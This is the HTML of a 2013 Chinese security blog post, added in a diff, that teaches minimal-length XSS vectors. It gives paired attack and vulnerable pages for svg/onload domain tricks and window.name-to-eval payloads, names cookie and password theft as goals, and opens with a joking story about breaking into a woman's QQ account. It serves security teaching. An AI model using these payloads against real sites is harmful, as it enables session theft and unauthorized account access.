@@ -1,0 +1,63 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Short XSS</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">Crackkay</a> <span class="bull">·</span> <time title="2013/08/21 12:17" ui-time="" datetime="2013/08/21 12:17" class="published ng-binding ng-isolate-scope">2013/08/21 12:17</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>关键时候长度不够怎么办？</p><p>在实际的情况中如果你不够长怎么办呢？看医生？吃药？做手术？。。。。。。。。。。。。。。算了，既然自身硬件不足，那么就把缺点变优点吧。熟话说：小是小威力好。</p><p>熟话说的好，要能长能短，收放自如。在很多的情况中，我们构造的语句是被限制在一定的字符数内。所以这个就是考验你能短的时候能不能短，能长的时候能不能长的时候到了。</p><h2>0x01 现实中的悲剧</h2><hr><p>这是一个活生生的悲剧，一个平台上面，一个二逼朋友有妹子的平台账号，但是二逼朋友想进妹子的QQ空间，用平台的备注插QQ-XSS代码，但是因为限制的字符太短，最终抱头痛哭。于是就有了下图所发生：</p><p><img alt="2013082023315075455.jpg" img-src="4835043ca46a1d05efd79dae74b3cbc6ecf17f18.jpg"></p><h2>0x02 怎么变”短”</h2><hr><pre><code>#!html
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt; 
+</code></pre><p>.............................27 letters?</p><h5>Alert(1)? No Run?</h5><h4>Impossible?</h4><h3>No!</h3><p>在实际情况中，可以通过<code>&lt;h1&gt;</code>短向量或者其他的短向量去测试存在XSS的地方，为什么可以这样？HTML是一门”不太严格”的解释语言，即使没有<code>&lt;/h1&gt;</code>，很多浏览器也照样可以解释为</p><pre><code>#!html
+&lt;h1&gt;xss&lt;/h1&gt;
+</code></pre><h3><code>&lt;h1&gt;</code>xss</h3><p>S1:</p><p><img alt="2013082023324089066.jpg" img-src="f352ba743cd6776c528d5bf5c08fb661f04bd7ce.jpg"></p><p></p><p></p><p></p><p>S2:</p><p><img alt="2013082023330469883.jpg" img-src="e13399fcb54cd1787480ca7031ce99de8936e1bd.jpg"></p><p>S3：</p><p><img alt="2013082023332018566.jpg" img-src="db8cecb1b37363137be36ca302b66d7d6cffe142.jpg"></p><p>但是如果在攻击的时候，我往往需要用到很多标签、属性来达到我们的目的。下面列出一些比较猥琐的利用</p><h3><code>&lt;svg/onload=domain=id&gt;</code></h3><p>S1:在chrome浏览器存在一个同域读取漏洞，为什么说同域呢？</p><p>S2:在chrome下如果我们访问www.baidu.com，通过控制台来设置一下域为空，document.domain=""，就会出现以下的错误。</p><p><img alt="2013082023341576811.jpg" img-src="dd573f9dd89fcad448d23e0e42b5b5cc4f207245.jpg"></p><p>S3:为什么说chrome浏览器存在一个同域读取漏洞呢?下面我们通过访问www.baidu.com.来访问一下（com后面还有一个.）并设置一下域为空</p><pre><code>#!javascript
+document.domain=""
+</code></pre><p>设置结果就会出现以下图片所示。</p><p><img alt="2013082023344564837.jpg" img-src="c42e6fe5e936450ec17e2bb0b1fd1fa46eb23fb4.jpg"></p><p>S4:这个怎么利用？</p><p>首先说一个问题，就是说，在同域的情况下，DOM是互通的。就相当于我a可以写b的，b也可以同样写a的。那我们该怎么来利用呢？我们可以干很多事情，比如说重写页面钓鱼，或者盗取同域Cookie。下面我就用Chrome的控制台来演示一下这个内容读取漏洞。</p><p>S5:先来看看两段代码：</p><p>本地构造的攻击页面如下：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+　　&lt;body&gt;
+    &lt;h1&gt;这是a.com./12.html&lt;/h1&gt;
+    &lt;svg/onload=domain=id&gt;
+　　&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>存在缺陷的XSS页面如下：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+　　&lt;body&gt;
+    &lt;h1&gt;这是b.com./11.html&lt;/h1&gt;
+　　  &lt;svg/onload=domain=id&gt;
+　　&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>S6:下面我们通过访问我们构造的攻击页面，也就是a.com./12.html，然后读取domain看看，结果如下图：</p><p><img alt="2013082023361468608.jpg" img-src="77b2ec98e988a773fddae429c3d825aeb875eb35.jpg"></p><p>S7:然后我们在控制台里面用window.open()方法打开打开存在缺陷的XSS页面.然后同样用domain查看域.</p><p><img alt="2013082023365253563.jpg" img-src="fcef00fc5f4caf82cc2b51b2ecf7242defca8bd7.jpg"></p><p>S8:我们从上面就可以查看出，现在a.com.和b.com.都是处于同一域下面，那么就可以实现DOM相通的概念了。</p><p>S9:通过DOM重写页面测试，测试结果如下图：</p><p><img alt="2013082023374053213.jpg" img-src="832891db08434db63ddbc1bae99cbc37a237bb2f.jpg"></p><p>S10:其实这个方法的用处很多，比如说我找到XXX的XSS页面，我通过把域置空，然后在自己站上构造一个页面，怎么构造就要看你的思维了，通过同域的DOM操作，可以钓鱼的方式盗取COOKIE、密码等。</p><h3><code>&lt;svg/onload=eval(name)&gt;</code></h3><p>S1:先把代码文译一下：</p><pre><code>#!html
+&lt;svg/onload=eval(window.name)&gt;
+</code></pre><p>S2:这一段代码通过svg载入的时候执行onload事件，执行的时候通过windows.name传递给eval执行，如果我们自己构造一个攻击页面，然后传递的XSS代码呢？下面看一段代码：</p><p>本地构造的攻击页面：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+　　&lt;body&gt;
+    &lt;iframe src="11.html" name="alert(1)"&gt;&lt;/iframe&gt;
+　　&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>存在缺陷的XSS页面：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+　&lt;body&gt;
+    &lt;svg/onload=eval(name)&gt;
+　&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>S3:然后运行页面，测试结果如下：</p><p><img alt="2013082023383876930.jpg" img-src="1d51dd15348be456648d5fa04569ed7d3a7cd9ba.jpg"></p><h3><code>&lt;i/onclick=URL=name&gt;</code></h3><p>S1:上面的代码文译一下：</p><pre><code>#!html
+&lt;i/onclick=document.URL=window.name&gt;
+</code></pre><p>S2:其实这段代码和上一段差不多多少，这里就不截图了，简单的讲解一下。通过点击执行事件把window.name的内容给document.URL然后执行javascript代码。那么我们可以怎么利用呢？</p><p>存在缺陷的XSS页面如下：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;i/onclick=URL=name&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>本地构造的攻击页面如下：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;iframe src="11.html" name="javascript:alert(1)"&gt;&lt;/iframe&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3><code>&lt;img src=x onerror=eval(name)&gt;</code></h3><p>S1:先把代码文译一下：</p><pre><code>#!html
+&lt;img src=x onerror=eval(window.name)&gt;
+</code></pre><p>S2:邪恶的eval又来了。通过img元素的src属性出错，执行onerror事件，通过邪恶的eval执行window.name里面的代码。</p><p>S3:那我们怎么来实现呢？</p><p>本地构造的攻击页面如下：</p><pre><code>#!html
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;iframe src="11.html" name="alert(1)"&gt;&lt;/iframe&gt;
+    &lt;/body&gt;
+</code></pre><p></p></section></article></div></main>
